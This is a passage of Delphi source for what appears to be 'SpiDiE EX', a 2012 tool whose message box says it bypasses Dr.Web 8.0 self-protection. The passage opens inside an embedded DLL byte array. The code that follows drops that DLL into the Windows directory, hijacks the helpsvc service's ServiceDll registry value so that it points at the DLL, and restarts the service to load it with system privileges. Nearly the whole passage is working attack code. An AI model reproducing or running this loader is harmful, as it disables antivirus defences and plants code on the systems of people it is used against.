	$67, $65, $73, $3E, $0D, $0A, $20, $20, $20, $20, $3C, $2F, $73, $65, $63, $75, 
	$72, $69, $74, $79, $3E, $0D, $0A, $20, $20, $3C, $2F, $74, $72, $75, $73, $74, 
	$49, $6E, $66, $6F, $3E, $0D, $0A, $3C, $2F, $61, $73, $73, $65, $6D, $62, $6C, 
	$79, $3E, $50, $41, $50, $41, $44, $44, $49, $4E, $47, $58, $58, $50, $41, $44, 
	$44, $49, $4E, $47, $50, $41, $44, $44, $49, $4E, $47, $58, $58, $50, $41, $44, 
	$44, $49, $4E, $47, $50, $41, $44, $44, $49, $4E, $47, $58, $58, $50, $41, $44, 
	$44, $49, $4E, $47, $50, $41, $44, $44, $49, $4E, $47, $58, $58, $50, $41, $44, 
	$44, $49, $4E, $47, $50, $41, $44, $44, $49, $4E, $47, $58, $58, $50, $41, $44, 
	$00, $10, $00, $00, $50, $00, $00, $00, $14, $30, $1A, $30, $20, $30, $2A, $30, 
	$30, $30, $57, $30, $73, $30, $82, $30, $89, $30, $A1, $30, $AA, $30, $CB, $30, 
	$DD, $30, $E8, $30, $EF, $30, $FF, $30, $0F, $31, $1A, $31, $1F, $31, $25, $31, 
	$2A, $31, $35, $31, $3B, $31, $43, $31, $4D, $31, $57, $31, $61, $31, $67, $31, 
	$6D, $31, $73, $31, $87, $31, $8D, $31, $96, $31, $9C, $31, $B4, $31, $00, $00, 
	$00, $30, $00, $00, $28, $00, $00, $00, $0C, $30, $10, $30, $18, $30, $1C, $30, 
	$20, $30, $24, $30, $28, $30, $2C, $30, $30, $30, $34, $30, $48, $32, $4C, $32, 
	$50, $32, $54, $32, $58, $32, $5C, $32, $00, $00, $00, $00, $00, $00, $00, $00, 
	$00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, 
	$00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, 
	$00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, 
	$00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, 
	$00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, 
	$00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, 
	$00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, 
	$00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, 
	$00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, 
	$00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, 
	$00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, 
	$00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, 
	$00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, 
	$00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, 
	$00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, 
	$00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, 
	$00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, 
	$00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, 
	$00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, 
	$00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, 
	$00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, 
	$00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, 
	$00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, 
	$00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00
);

implementation

procedure StartFakeService();
var
  hscm, hsrv: SC_HANDLE;
  status1: SERVICE_STATUS;
  k: integer;
begin
  hscm := OpenSCManagerW(nil, nil, SC_MANAGER_ALL_ACCESS);
  if (hscm <> 0) then
  begin
     hsrv := OpenServiceW(hscm, 'helpsvc', SERVICE_ALL_ACCESS);
     if (hsrv <> 0) then
     begin
       QueryServiceStatus(hsrv, @status1);
       if (status1.dwCurrentState <> SERVICE_STOPPED) then
       begin
         ControlService(hsrv, SERVICE_CONTROL_STOP, @status1);
         k := 0;
         while (status1.dwCurrentState <> SERVICE_STOPPED) do
         begin
           inc(k);
           if (k > 8) then break;
           Sleep(250);
           QueryServiceStatus(hsrv, @status1);
         end;
       end;
       Sleep(1000);
       StartServiceW(hsrv, 0, nil);
       CloseServiceHandle(hsrv);
     end;
     CloseServiceHandle(hscm);
  end;
  MessageBoxW(0, 'Done, thanks for watching :)', 'meow', MB_OK);
end;

procedure InstallFakeService();
var
  lRet: LONG;
  hObject: HKEY;
  buf: LBuf;
  u: integer;
begin
  memzero(@buf, sizeof(LBuf));
  GetWindowsDirectoryW(@buf, MAX_PATH);
  strcatW(buf, '\dll.dll');
  WinNative.Internal_WriteBufferToFile(buf, @data, sizeof(data));
  lRet := RegOpenKeyExW(HKEY_LOCAL_MACHINE,
    'SYSTEM\CurrentControlSet\Services\helpsvc\Parameters', 0, KEY_ALL_ACCESS, hObject);
  if (lRet <> ERROR_SUCCESS) then
    exit;
  u := (strlenW(buf) * sizeof(wchar)) + sizeof(wchar);
  RegSetValueExW(hObject, 'ServiceDll', 0, REG_EXPAND_SZ, @buf, u);
  RegCloseKey(hObject);
  StartFakeService();
end;

begin
  MessageBoxW(0, 'SpiDiE EX by rin, Nov 2012'#13#10#13#10 +
  'Based on EP_X0FF''s SpiDiE v2.2 from 2010'#13#10 +
  'Bypassing of all Dr.Web 8.0 SP in one click :)'
  , 'meow', MB_ICONINFORMATION);
  InstallFakeService();
  ExitProcess(0);
end.

